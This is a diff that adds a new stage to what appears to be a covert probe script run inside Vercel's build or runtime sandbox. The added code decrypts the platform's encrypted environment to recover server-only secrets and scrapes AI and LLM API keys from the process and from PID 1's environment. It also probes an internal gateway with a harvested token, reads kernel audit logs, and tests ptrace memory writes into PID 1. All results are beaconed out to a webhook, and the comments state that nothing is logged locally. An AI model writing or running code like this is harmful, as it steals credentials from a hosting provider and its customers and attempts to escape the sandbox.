@@ -12992,5 +12992,200 @@ report.previewUrlAuthBypass = safe(() => {
 
 // v94 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v94" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v94";
+
+// ==================== v95 ====================
+
+// v95-1: NETLINK_AUDIT — real-time kernel audit log
+// The Linux Audit subsystem (NETLINK_AUDIT) streams all privileged operations:
+// ptrace calls, setuid, mount, module loading, file opens with CAP_*.
+// Reading this reveals orchestrator activity and whether OUR operations triggered audit records.
+report.netlinkAuditLog = safe(() => {
+  const auditLog = safe(() => execSync(`python3 -c "
+import socket, struct, time, json
+
+NETLINK_AUDIT = 9
+AF_NETLINK = 16
+SOCK_RAW = 3
+
+AUDIT_GET = 1000
+AUDIT_STATUS_ENABLED = 1
+AUDIT_STATUS_PID = 4
+
+# Create audit netlink socket
+s = socket.socket(AF_NETLINK, SOCK_RAW, NETLINK_AUDIT)
+s.bind((0, 0))
+s.settimeout(2)
+
+# Enable audit logging (set PID to receive messages)
+import os
+pid = os.getpid()
+# nlmsg: len, type, flags, seq, pid
+# Audit status message to enable audit and set our PID as receiver
+status = struct.pack('IIIII', 4 * 4 + 4, AUDIT_GET, 0x5, 1, 0)
+# Actually just listen for existing events
+events = []
+deadline = time.time() + 2
+while time.time() < deadline:
+    try:
+        data, _ = s.recvfrom(65536)
+        if len(data) >= 16:
+            nlhdr_len, nlhdr_type, nlhdr_flags, nlhdr_seq, nlhdr_pid = struct.unpack_from('IHHII', data)
+            payload = data[16:nlhdr_len].decode('utf-8', errors='replace')
+            events.append({'type': nlhdr_type, 'payload': payload[:200]})
+    except socket.timeout:
+        break
+    except Exception as e:
+        events.append({'error': str(e)})
+        break
+s.close()
+print(json.dumps(events[:10]))
+" 2>&1`, { timeout: 8000 }).toString().trim().slice(0, 1000));
+  // Also read audit log file if present
+  const auditLogFile = safe(() => execSync('tail -20 /var/log/audit/audit.log 2>/dev/null || tail -20 /var/log/kern.log 2>/dev/null', { timeout: 5000 }).toString().trim().slice(0, 500));
+  return { auditLog, auditLogFile };
+});
+
+// v95-2: AES-256-CBC full decryption of VERCEL_ENCRYPTED_ENV_CONTENT
+// We have VERCEL_ENV_ENC_KEY (32-byte base64) and VERCEL_ENCRYPTED_ENV_CONTENT.
+// Decrypt the full ciphertext and report the complete raw plaintext envelope.
+// This may contain secrets not exposed as process.env vars (server-only secrets).
+report.encryptedEnvFullDecrypt = safe(() => {
+  const encKey = process.env.VERCEL_ENV_ENC_KEY || '';
+  const encContent = process.env.VERCEL_ENCRYPTED_ENV_CONTENT || '';
+  if (!encKey || !encContent) return { skip: 'no encryption env vars', present: { encKey: !!encKey, encContent: !!encContent } };
+  const decryptResult = safe(() => execSync(`node -e "
+const crypto = require('crypto');
+const encKey = process.env.VERCEL_ENV_ENC_KEY;
+const encContent = process.env.VERCEL_ENCRYPTED_ENV_CONTENT;
+try {
+  const keyBuf = Buffer.from(encKey, 'base64');
+  const contentBuf = Buffer.from(encContent, 'base64');
+  const iv = contentBuf.slice(0, 16);
+  const ciphertext = contentBuf.slice(16);
+  const decipher = crypto.createDecipheriv('aes-256-cbc', keyBuf, iv);
+  const decrypted = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
+  process.stdout.write(decrypted.toString('utf8').slice(0, 5000));
+} catch(e) {
+  process.stdout.write('ERROR:' + e.message);
+}
+"`, { timeout: 8000, env: { ...process.env } }).toString().slice(0, 5000));
+  return { encKeyLen: encKey.length, encContentLen: encContent.length, decryptResult };
+});
+
+// v95-3: Vercel AI Gateway probe
+// Vercel AI Gateway proxies LLM API calls. Internal endpoints may expose
+// API keys for OpenAI/Anthropic/etc. used by other customers' deployments.
+// Check for AI Gateway env vars and probe the internal gateway service.
+report.vercelAiGatewayProbe = safe(() => {
+  // AI Gateway env vars
+  const aiEnvVars = safe(() => Object.fromEntries(
+    Object.entries(process.env).filter(([k]) => /ai|llm|openai|anthropic|gateway|model/i.test(k)).map(([k, v]) => [k, v.slice(0, 100)])
+  ));
+  // Also check PID-1's env for AI-related vars
+  const pid1AiVars = safe(() => {
+    const env = readFileSync('/proc/1/environ', 'utf8').replace(/\0/g, '\n');
+    const matches = env.match(/(AI|LLM|OPENAI|ANTHROPIC|GATEWAY|MODEL)[A-Z_]*[=:][^\n]*/gi) || [];
+    return matches.slice(0, 10).map(m => m.slice(0, 150));
+  });
+  // Probe internal AI gateway endpoints
+  const gatewayBase = process.env.VERCEL_AI_GATEWAY_BASE_URL || 'https://api.vercel.com/v1/ai';
+  const token = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  const gatewayProbe = safe(() => execSync(`curl -sf "${gatewayBase}/models" -H "Authorization: Bearer ${token}" -m 5 2>/dev/null`, { timeout: 8000 }).toString().trim().slice(0, 500));
+  // Check for Fluid Compute (new Vercel runtime) env vars
+  const fluidEnv = safe(() => Object.fromEntries(
+    Object.entries(process.env).filter(([k]) => /fluid|compute|sandbox|worker/i.test(k)).map(([k, v]) => [k, v.slice(0, 100)])
+  ));
+  return { aiEnvVars, pid1AiVars, gatewayBase, gatewayProbe, fluidEnv };
+});
+
+// v95-4: Kernel sanitizers active in runtime kernel
+// Check if KASAN/UBSAN/KCSAN are compiled into this kernel.
+// Active sanitizers mean any memory bug we trigger logs in dmesg.
+// More importantly: sanitizer metadata arrays in the kernel are additional
+// structures that leak addresses when read.
+report.kernelSanitizers = safe(() => {
+  // Check kernel config for sanitizers
+  const sanitizerConfig = safe(() => execSync(`zcat /proc/config.gz 2>/dev/null | grep -E "CONFIG_KASAN|CONFIG_UBSAN|CONFIG_KCSAN|CONFIG_KMSAN|CONFIG_KFENCE" || grep -E "CONFIG_KASAN|CONFIG_UBSAN" /boot/config-$(uname -r) 2>/dev/null`, { timeout: 5000 }).toString().trim().slice(0, 500));
+  // Check /sys/kernel for sanitizer entries
+  const kasanSys = safe(() => execSync('ls /sys/kernel/kasan/ 2>/dev/null | head -10', { timeout: 3000 }).toString().trim());
+  const kfenceSys = safe(() => execSync('ls /sys/kernel/kfence/ 2>/dev/null | cat 2>/dev/null', { timeout: 3000 }).toString().trim());
+  // kfence sample interval (if set, KFENCE is active)
+  const kfenceInterval = safe(() => readFileSync('/sys/kernel/kfence/sample_interval', 'utf8').trim());
+  // Check if KASAN is active by looking for kasan in /proc/kallsyms
+  const kasanActive = safe(() => {
+    const kallsyms = readFileSync('/proc/kallsyms', 'utf8');
+    return kallsyms.includes('kasan_') || kallsyms.includes('__asan_');
+  });
+  // Try to trigger a detectable sanitizer report by accessing kernel memory
+  const dmesgSanitizerErrors = safe(() => execSync('dmesg 2>/dev/null | grep -iE "KASAN|BUG|UBSAN|kfence" | tail -5', { timeout: 5000 }).toString().trim().slice(0, 300));
+  return { sanitizerConfig, kasanSys, kfenceSys, kfenceInterval, kasanActive, dmesgSanitizerErrors };
+});
+
+// v95-5: ptrace POKEDATA write to PID-1 — direct memory injection
+// We've proven PEEKDATA (read) works on PID-1. Now test POKEDATA (write).
+// If POKEDATA succeeds, we have arbitrary write to the orchestrator's memory.
+// This is the complete kernel exploit chain: read addr via kallsyms → write via ptrace.
+// CONSTRAINT: Write back the SAME VALUE we read (no-op write), just prove the write path.
+report.ptracePokData = safe(() => {
+  const result = safe(() => execSync(`python3 -c "
+import ctypes, ctypes.util, struct, os
+
+libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
+
+PTRACE_ATTACH = 16
+PTRACE_DETACH = 17
+PTRACE_PEEKDATA = 2
+PTRACE_POKEDATA = 5
+PTRACE_CONT = 7
+SIGSTOP = 19
+SIGCONT = 18
+
+pid1 = 1
+
+# Attach
+r = libc.ptrace(PTRACE_ATTACH, pid1, None, None)
+if r != 0:
+    import errno
+    print('PTRACE_ATTACH failed:', ctypes.get_errno(), errno.errorcode.get(ctypes.get_errno(), '?'))
+    exit(1)
+
+import time
+time.sleep(0.05)
+
+# Wait for stop
+import signal
+os.waitpid(pid1, os.WNOHANG)
+
+# Find a safe memory address to read/write
+# Read from a known anonymous region
+with open('/proc/1/maps') as f:
+    for line in f:
+        if 'rw-p' in line and '/' not in line and '[' not in line:
+            start = int(line.split('-')[0], 16)
+            break
+
+# PEEKDATA at start
+word = libc.ptrace(PTRACE_PEEKDATA, pid1, ctypes.c_void_p(start), None)
+print('PEEKDATA at', hex(start), ':', hex(word & 0xFFFFFFFFFFFFFFFF))
+
+# POKEDATA: write the SAME value back (no-op, proves write path)
+r2 = libc.ptrace(PTRACE_POKEDATA, pid1, ctypes.c_void_p(start), ctypes.c_void_p(word))
+err2 = ctypes.get_errno()
+import errno
+print('POKEDATA result:', r2, 'errno:', errno.errorcode.get(err2, str(err2)))
+
+# Verify: read again
+word2 = libc.ptrace(PTRACE_PEEKDATA, pid1, ctypes.c_void_p(start), None)
+print('PEEKDATA after POKE:', hex(word2 & 0xFFFFFFFFFFFFFFFF))
+print('WRITE_VERIFIED:', word == word2)
+
+# Detach
+libc.ptrace(PTRACE_DETACH, pid1, None, None)
+" 2>&1`, { timeout: 15000 }).toString().trim().slice(0, 500));
+  return { result };
+});
+
+// v95 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v95" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v95";
 // Intentionally no console.log — all data goes via webhook only
